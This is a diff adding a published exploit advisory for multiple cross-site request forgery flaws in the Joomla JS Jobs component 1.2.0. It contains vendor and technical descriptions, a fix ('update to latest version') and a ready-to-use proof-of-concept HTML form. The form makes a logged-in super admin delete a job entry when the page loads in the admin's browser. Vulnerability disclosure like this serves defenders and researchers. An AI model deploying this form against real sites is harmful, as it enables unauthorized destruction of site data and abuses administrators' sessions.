@@ -1,0 +1,68 @@
+#######################################
+# Exploit Title: Joomla! Component Js Jobs - Multiple Cross Site Request Forgery Vulnerabilities
+# Google Dork: N/A
+# Date: 17-04-2018
+#######################################
+# Exploit Author: Sureshbabu Narvaneni#
+#######################################
+# Author Blog : http://nullnews.in
+# Vendor Homepage: https://www.joomsky.com
+# Software Link: https://extensions.joomla.org/extension/js-jobs/
+# Affected Version: 1.2.0
+# Category: WebApps
+# Tested on: Win7 Enterprise x86/Kali Linux 4.12 i686
+# CVE : NA
+#######################################
+
+1. Vendor Description:
+
+JS Jobs for any business, industry body or staffing company wishing to
+establish a presence on the internet. JS Jobs allows you to run your own,
+unique jobs classifieds service where you or employer can advertise their
+jobs and job seekers can upload their Resumes.
+
+2. Technical Description:
+
+The state changing actions in JS Jobs before 1.2.1 not having any random
+token validation which results in Cross Site Request Forgery Vulnerability.
+
+3. Proof of Concept:
+
+Delete Job Entry [Super Admin Access]
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://[URL]/joomla/administrator/index.php"
+method="POST">
+      <input type="hidden" name="js&#95;sortby" value="0" />
+      <input type="hidden" name="companyname" value="" />
+      <input type="hidden" name="jobtitle" value="" />
+      <input type="hidden" name="location" value="" />
+      <input type="hidden" name="jobcategory" value="" />
+      <input type="hidden" name="jobtype" value="" />
+      <input type="hidden" name="datefrom" value="" />
+      <input type="hidden" name="dateto" value="" />
+      <input type="hidden" name="status" value="" />
+      <input type="hidden" name="cid&#91;&#93;" value="[Job ID]" />
+      <input type="hidden" name="limit" value="20" />
+      <input type="hidden" name="limitstart" value="0" />
+      <input type="hidden" name="option" value="com&#95;jsjobs" />
+      <input type="hidden" name="task" value="job&#46;jobenforcedelete" />
+      <input type="hidden" name="c" value="job" />
+      <input type="hidden" name="view" value="job" />
+      <input type="hidden" name="layout" value="jobs" />
+      <input type="hidden" name="callfrom" value="jobs" />
+      <input type="hidden" name="boxchecked" value="1" />
+      <input type="hidden" name="sortby" value="asc" />
+      <input type="hidden" name="my&#95;click" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+4. Solution:
+
+Update to latest version
+
+https://extensions.joomla.org/extension/js-jobs/
